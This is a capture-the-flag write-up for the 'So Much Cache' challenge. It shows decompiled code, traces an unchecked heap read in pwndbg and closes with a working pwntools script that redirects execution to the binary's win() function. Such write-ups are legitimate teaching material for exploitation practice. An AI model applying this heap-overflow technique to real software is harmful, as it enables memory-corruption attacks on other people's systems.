# Challenge Name: So Much Cache


## Description:


Author: @WittsEnd

If you couldn't tell, we're all about the dollar bills... CTF challenges for Blackjack, moneybags, and so much cash!!


This binary is statically linked, though the libc for this binary is version 2.28. We've provided the libc below for your reference.


## Solution:


When we run the binary, it displays this menu:


```
└─$ ./so_much_cache  
+---------------------+
|         Menu        |
+---------------------+
| 1. allocate memory  |
| 2. freeing memory   |
| 3. exit             |
| 4. Prepare Jump!    |
| 5. Jump!            |
+---------------------+
| select [1-5] : 
```


From the menu, all the given options are clear. Let's see how the binary works.


![Screenshot from 2024-05-31 12-35-14](https://github.com/Parshva87/CTF-Writeup/assets/55111077/b90eb675-2425-4916-8e8e-1333fd3b5e72)


The first prompt takes the user input for the size (which allocates the memory) and then takes the user input for the data to save to the allocated memory.


Let's analyze the binary and see how the `allocate_memory` function works. (I used Binary Ninja to analyze this binary.)


This is how the `main()` function looks:


![Screenshot from 2024-05-26 22-04-22](https://github.com/Parshva87/CTF-Writeup/assets/55111077/5c4482dd-cd97-49b2-9685-df63e15e5f99)


From the name of the function `create_memory()`, it is clear that it allocates the memory, and the `release_memory()` function frees the allocated memory.


![Screenshot from 2024-05-31 11-51-34](https://github.com/Parshva87/CTF-Writeup/assets/55111077/d186531c-fd1d-49ee-84fd-0a774ebf2f50)


When we look look at the options `4. Prepare Jump! ` and `5. Jump!`,


![Screenshot from 2024-05-31 17-19-25](https://github.com/Parshva87/CTF-Writeup/assets/55111077/4ddb516c-fccf-4ea9-83f4-7367485a5d0e)


In choice 4 `(Prepare Jump)`, it simply allocates 24 (0x18) bytes of memory and assigns the address of that allocated memory to the variable `var_10`. Then, in choice 5 `(Jump)`, it jumps to the address `var_10` chosen by the user (1, 2, or 3). (Explained clearly later)


![Screenshot from 2024-05-31 18-19-10](https://github.com/Parshva87/CTF-Writeup/assets/55111077/a3969edf-ae30-4058-8e29-94819c1a3200)


While looking at the code of the `create_memory()` and `release_memory()` functions, I stumbled upon a function that will be our main target to get the flag: `win()`.


![Screenshot from 2024-05-31 11-50-53](https://github.com/Parshva87/CTF-Writeup/assets/55111077/4646f721-14aa-4599-bbd0-c4bec4aff4b8)



Now, Let's break down how the `create_memory()` function works:


```
00400abb  uint64_t create_memory()
00400abb  {
00400acd      _IO_printf("[?] size : ", 0);
00400ae3      __isoc99_scanf(&data_4a1bc8, 0);              <--- It reads from the user input for size
00400af2      _IO_printf("[?] data : ", 0);
00400aff      int32_t var_c;                                <--- Then it assigned the user input to the varible c 
00400aff      if (var_c <= 0x88)                            <--- This if conditions checks, if the varible c it less than or equal to 136 (0x88) 
00400afa      {
00400b0e          buf = __libc_malloc(((int64_t)var_c));    <--- If the user input it less or equal to 136, the it set the buffer size to user input. 
00400b21          buf;
00400b30          read();                                   <--- Then it read for the data 
00400b30      }
00400b41      return _IO_puts("[+] memory allocated!");
00400b35  }

```


The vulnerability in the `create_memory()` function is that it sets the buffer size to the entered value of input `[size]` (var_c), but when it reads the input and saves it into `[data]`, it does not check how much data the user is passing into the input.


![Screenshot from 2024-05-31 15-36-32](https://github.com/Parshva87/CTF-Writeup/assets/55111077/847c20bc-067e-42f2-a4ac-86c5b0a0c9da)


This means we can overwrite the top chunk value, and this vulnerability is known as the House of Force.


Let's run the binary in pwndbg and try to overwrite the top chunk.


Run the binary, set the size to 20, and enter more than 20 characters in the data to overwrite the top chunk.


![Screenshot from 2024-05-31 15-58-31](https://github.com/Parshva87/CTF-Writeup/assets/55111077/2403859d-f3f9-4f7b-9c3b-9784763d5595)


 Then hit `ctrl + c` to break the program flow and type `vis_heap_chunks`


![Screenshot from 2024-05-31 15-58-50](https://github.com/Parshva87/CTF-Writeup/assets/55111077/908b08d0-7b7c-459e-bc4e-c12bf3278dae)


Since the binary is compiled statically, we need to set the glibc version used to compile the binary in pwndbg.


The `libc.so.6` file is provided with the challenge binary. We can find the version from the `libc.so.6` file using the `strings` command.


` strings libc.so.6 | grep glibc `


![Screenshot from 2024-05-31 16-18-31](https://github.com/Parshva87/CTF-Writeup/assets/55111077/7265ee28-e3b7-414f-836c-55e7de7349f0)


Use the command `set glibc 2.23` to set the glibc version and `r` or `run` to re-run the program.


![Screenshot from 2024-05-31 16-44-45](https://github.com/Parshva87/CTF-Writeup/assets/55111077/598ff519-b811-4fac-a0a4-55b07e22ebf5)


Now, let's see if we can view the data in the allocated heap chunks and check if the top chunk has been overwritten with our input.


![Screenshot from 2024-05-31 18-40-31](https://github.com/Parshva87/CTF-Writeup/assets/55111077/e81cad5a-49dc-4a3f-81c7-22aec5d5c13b)


Use `vis_heap_chunks` command to Visualize heap chunks.


![Screenshot from 2024-05-31 18-41-34](https://github.com/Parshva87/CTF-Writeup/assets/55111077/f7447a79-6021-49e7-a289-ebfea5c6ddd7)


In the above screenshot we can see that our top chunk is overwritten with address `0x6161616161616161` aaaaaaaa 


Now Let's see what happens if we allocate the memory one more time with options 1.


Use the `c` or `continue` command to continue the program flow. Choose option 1, and this time, we will enter only 4 `b`s to see how our other allocated memory looks.


![Screenshot from 2024-05-31 19-01-06](https://github.com/Parshva87/CTF-Writeup/assets/55111077/09461d79-c330-43c2-a1d6-8042039f1672)


Now with `vis_heap_chunks` when we look at our new allocated memory, We can see our entered 4 `b`'s and also our previously entered `a`'s in that newly allocated memory.


![Screenshot from 2024-05-31 19-07-57](https://github.com/Parshva87/CTF-Writeup/assets/55111077/105a7701-cd86-4745-b984-dc15deb2dead)


This means, when we overwrite the top chunk, we are also writing over data at memory addresses beyond the allocated heap chunks. That's why when we allocate a new chunk, it has our previously entered data.


Now, let's try the same thing: 


1. First, overwrite the top chunk.
2. Then, instead of allocating a new chunk with option `1. allocate memory`, this time we will use option `4. Prepare Jump!` to allocate memory.
3. Then will choose option `5. Jump!` and jump to the number `1`. (Options 1, 2, and 3 are given when we select option 5).


`1. First, overwrite the top chunk:`


This time, instead of `a`, I used the string `aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll` to see which part of the entered string we will jump to when we choose option `5`.


![Screenshot from 2024-05-31 19-25-17](https://github.com/Parshva87/CTF-Writeup/assets/55111077/ffe7c27d-6a3b-4906-baa6-0b159e4b7a06)


Let's do `vis_heap_chunks` to confirm that we overwrite the top chunk.


![Screenshot from 2024-05-31 19-28-49](https://github.com/Parshva87/CTF-Writeup/assets/55111077/6e591971-1e85-453c-a5dd-cfa744a80bf3)


To confirm that we have also overwritten the data beyond the allocated chunks, we can use the examine command `x`:


`x/16gx address` (Examine 16 giant of data in hex format at a specified address.)


![Screenshot from 2024-05-31 19-32-27](https://github.com/Parshva87/CTF-Writeup/assets/55111077/f3a0796f-e971-464d-897d-00a504cf2f8c)


In the above screenshot, we can confirm that memory after the top chunk is also overwritten with our data.


`2. Allocate memory using option 4. Prepare Jump!`


Use `c` to continue, then press `Enter` to print the menu, and select `4` to allocate memory (Prepare Jump!).


![Screenshot from 2024-05-31 19-59-05](https://github.com/Parshva87/CTF-Writeup/assets/55111077/e1e20129-9abb-41b0-a92f-6811f8e90d32)


 Let's see how our allocated heap chunks look with the `vis_heap_chunks` command.

 
![Screenshot from 2024-05-31 19-52-01](https://github.com/Parshva87/CTF-Writeup/assets/55111077/c7a884c9-7df5-4570-a0e7-51d3f79e3974)


In the above screenshot we can see that our newly allocated heap chunk has our previuos entered data.


`3. Now let's Jump!` 


Use `c` to continue, then press `Enter` to print the menu, and select `5`. Then, enter `1` to jump to location 1.


![Screenshot from 2024-05-31 20-06-03](https://github.com/Parshva87/CTF-Writeup/assets/55111077/66ea958a-0add-4e80-9ef5-da5a3ef2140b)


In the above screenshot, we can see that when we jump to location 1, we get the `Segmentation fault` error. In the `DISASM` section, we can see that the program is trying to call the address `0x6a6a6a6a69696969`, which does not exist. This error occurs because the address `0x6a6a6a6a69696969` that the program is trying to call is actually from our entered data `iiiijjjj`.


Also, previously when we choose the option `4` to set the jump and looked at the heap chunks data, the first 8-byte data was `0x6a6a6a6a69696969 (iiiijjjj) ` 


![Screenshot from 2024-05-31 20-18-37](https://github.com/Parshva87/CTF-Writeup/assets/55111077/94f3878b-a86f-4bcc-af56-d1b8cbd181d1)


So, if we replace the `iiiijjjj (0x6a6a6a6a69696969)` with the address of the `win()` function and then jump to that location, the program will call the `win()` function.


`payload = b'aaaabbbbccccddddeeeeffffgggghhhh' + win()`


Let's write the pwntools script to automate our exploit. 


# Final exploit: -


```
from pwn import *

binary = 'so_much_cache'
elf = context.binary = ELF(binary)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 30848)
    else:
        return process(elf.path)

def allocate(size,data):
   p.recvuntil(b'[1-5] :')
   p.sendline(b'1')
   p.recvuntil(b'size :')
   p.sendline(size)
   p.recvuntil(b'data :')
   p.sendline(data)

def setjump():
   p.recvuntil(b'[1-5] :')
   p.sendline(b'4')

def tojump(numb):
   p.recvuntil(b'[1-5] :')
   p.sendline(b'5')
   p.recvuntil(b'(1, 2, or 3)')
   p.sendline(numb)
   flag = p.recvuntil(b'}\n').decode().strip()
   log.info(flag)

p = start() 

win_function = elf.sym['win']   # 0x004009ae

log.info("Overwriting the top chunk.",)

#aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
#aaaabbbbccccddddeeeeffffgggghhhh + win()
# a*32 + win_function

payload = b'a'*32 + p64(win_function)

allocate(b'20' , payload)

log.info("Set the jump!")
setjump()

log.info("Jump to win()")
tojump(b'1')

#p.interactive()

```

